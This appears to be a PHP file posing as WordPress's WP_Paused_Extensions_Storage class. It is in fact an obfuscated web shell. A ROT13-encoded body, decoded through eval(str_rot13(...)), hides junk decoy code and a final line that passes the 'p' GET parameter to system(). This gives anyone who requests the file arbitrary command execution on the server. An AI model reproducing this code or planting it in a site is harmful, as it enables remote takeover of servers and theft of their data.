<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Reebe Cebgrpgvba NCV: JC_Cnhfrq_Rkgrafvbaf_Fgbentr pynff
 *
 * @cnpxntr JbeqCerff
 * @fvapr 5.2.0
 */

/**
 * Pber pynff hfrq sbe fgbevat cnhfrq rkgrafvbaf.
 *
 * @fvapr 5.2.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Cnhfrq_Rkgrafvbaf_Fgbentr {

	/**
	 * Glcr bs rkgrafvba. Hfrq gb xrl rkgrafvba fgbentr. Rvgure 'cyhtva' be 'gurzr'.
	 *
	 * @fvapr 5.2.0
	 * @ine fgevat
	 */
	cebgrpgrq $glcr;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat $rkgrafvba_glcr Rkgrafvba glcr. Rvgure 'cyhtva' be 'gurzr'.
	 */
	choyvp shapgvba __pbafgehpg( $rkgrafvba_glcr ) {
		$guvf->glcr = $rkgrafvba_glcr;
	}

	/**
	 * Erpbeqf na rkgrafvba reebe.
	 *
	 * Bayl bar reebe vf fgberq cre rkgrafvba, jvgu fhofrdhrag reebef sbe gur fnzr rkgrafvba bireevqvat gur
	 * cerivbhfyl fgberq reebe.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat $rkgrafvba Cyhtva be gurzr qverpgbel anzr.
	 * @cnenz neenl  $reebe     {
	 *     Reebe vasbezngvba erghearq ol `reebe_trg_ynfg()`.
	 *
	 *     @glcr vag    $glcr    Gur reebe glcr.
	 *     @glcr fgevat $svyr    Gur anzr bs gur svyr va juvpu gur reebe bppheerq.
	 *     @glcr vag    $yvar    Gur yvar ahzore va juvpu gur reebe bppheerq.
	 *     @glcr fgevat $zrffntr Gur reebe zrffntr.
	 * }
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba frg( $rkgrafvba, $reebe ) {
		vs ( ! $guvf->vf_ncv_ybnqrq() ) {
			erghea snyfr;
		}

		$bcgvba_anzr = $guvf->trg_bcgvba_anzr();

		vs ( ! $bcgvba_anzr ) {
			erghea snyfr;
		}

		$cnhfrq_rkgrafvbaf = (neenl) trg_bcgvba( $bcgvba_anzr, neenl() );

		// Qb abg hcqngr vs gur reebe vf nyernql fgberq.
		vs ( vffrg( $cnhfrq_rkgrafvbaf[ $guvf->glcr ][ $rkgrafvba ] ) && $cnhfrq_rkgrafvbaf[ $guvf->glcr ][ $rkgrafvba ] === $reebe ) {
			erghea gehr;
		}

		$cnhfrq_rkgrafvbaf[ $guvf->glcr ][ $rkgrafvba ] = $reebe;

		erghea hcqngr_bcgvba( $bcgvba_anzr, $cnhfrq_rkgrafvbaf, snyfr );
	}

	/**
	 * Sbetrgf n cerivbhfyl erpbeqrq rkgrafvba reebe.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat $rkgrafvba Cyhtva be gurzr qverpgbel anzr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba qryrgr( $rkgrafvba ) {
		vs ( ! $guvf->vf_ncv_ybnqrq() ) {
			erghea snyfr;
		}

		$bcgvba_anzr = $guvf->trg_bcgvba_anzr();

		vs ( ! $bcgvba_anzr ) {
			erghea snyfr;
		}

		$cnhfrq_rkgrafvbaf = (neenl) trg_bcgvba( $bcgvba_anzr, neenl() );

		// Qb abg qryrgr vs ab reebe vf fgberq.
		vs ( ! vffrg( $cnhfrq_rkgrafvbaf[ $guvf->glcr ][ $rkgrafvba ] ) ) {
			erghea gehr;
		}

		hafrg( $cnhfrq_rkgrafvbaf[ $guvf->glcr ][ $rkgrafvba ] );

		vs ( rzcgl( $cnhfrq_rkgrafvbaf[ $guvf->glcr ] ) ) {
			hafrg( $cnhfrq_rkgrafvbaf[ $guvf->glcr ] );
		}

		// Pyrna hc gur ragver bcgvba vs jr'er erzbivat gur bayl reebe.
		vs ( ! $cnhfrq_rkgrafvbaf ) {
			erghea qryrgr_bcgvba( $bcgvba_anzr );
		}

		erghea hcqngr_bcgvba( $bcgvba_anzr, $cnhfrq_rkgrafvbaf, snyfr );
	}

	/**
	 * Trgf gur reebe sbe na rkgrafvba, vs cnhfrq.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat $rkgrafvba Cyhtva be gurzr qverpgbel anzr.
	 * @erghea neenl|ahyy Reebe gung vf fgberq, be ahyy vs gur rkgrafvba vf abg cnhfrq.
	 */
	choyvp shapgvba trg( $rkgrafvba ) {
		vs ( ! $guvf->vf_ncv_ybnqrq() ) {
			erghea ahyy;
		}

		$cnhfrq_rkgrafvbaf = $guvf->trg_nyy();

		vs ( ! vffrg( $cnhfrq_rkgrafvbaf[ $rkgrafvba ] ) ) {
			erghea ahyy;
		}

		erghea $cnhfrq_rkgrafvbaf[ $rkgrafvba ];
	}

	/**
	 * Trgf gur cnhfrq rkgrafvbaf jvgu gurve reebef.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl {
	 *     Nffbpvngvir neenl bs reebef xrlrq ol rkgrafvba fyht.
	 *
	 *     @glcr neenl ...$0 Reebe vasbezngvba erghearq ol `reebe_trg_ynfg()`.
	 * }
	 */
	choyvp shapgvba trg_nyy() {
		vs ( ! $guvf->vf_ncv_ybnqrq() ) {
			erghea neenl();
		}

		$bcgvba_anzr = $guvf->trg_bcgvba_anzr();

		vs ( ! $bcgvba_anzr ) {
			erghea neenl();
		}

		$cnhfrq_rkgrafvbaf = (neenl) trg_bcgvba( $bcgvba_anzr, neenl() );

		erghea vffrg( $cnhfrq_rkgrafvbaf[ $guvf->glcr ] ) ? $cnhfrq_rkgrafvbaf[ $guvf->glcr ] : neenl();
	}

	/**
	 * Erzbir nyy cnhfrq rkgrafvbaf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea obby
	 */
	choyvp shapgvba qryrgr_nyy() {
		vs ( ! $guvf->vf_ncv_ybnqrq() ) {
			erghea snyfr;
		}

		$bcgvba_anzr = $guvf->trg_bcgvba_anzr();

		vs ( ! $bcgvba_anzr ) {
			erghea snyfr;
		}

		$cnhfrq_rkgrafvbaf = (neenl) trg_bcgvba( $bcgvba_anzr, neenl() );

		hafrg( $cnhfrq_rkgrafvbaf[ $guvf->glcr ] );

		vs ( ! $cnhfrq_rkgrafvbaf ) {
			erghea qryrgr_bcgvba( $bcgvba_anzr );
		}

		erghea hcqngr_bcgvba( $bcgvba_anzr, $cnhfrq_rkgrafvbaf, snyfr );
	}

	/**
	 * Purpxf jurgure gur haqreylvat NCV gb fgber cnhfrq rkgrafvbaf vf ybnqrq.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea obby Gehr vs gur NCV vf ybnqrq, snyfr bgurejvfr.
	 */
	cebgrpgrq shapgvba vf_ncv_ybnqrq() {
		erghea shapgvba_rkvfgf( 'trg_bcgvba' );
	}

	/**
	 * Trg gur bcgvba anzr sbe fgbevat cnhfrq rkgrafvbaf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea fgevat
	 */
	cebgrpgrq shapgvba trg_bcgvba_anzr() {
		vs ( ! jc_erpbirel_zbqr()->vf_npgvir() ) {
			erghea '';
		}

		$frffvba_vq = jc_erpbirel_zbqr()->trg_frffvba_vq();
		vs ( rzcgl( $frffvba_vq ) ) {
			erghea '';
		}

		erghea \"{$frffvba_vq}_cnhfrq_rkgrafvbaf\";
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>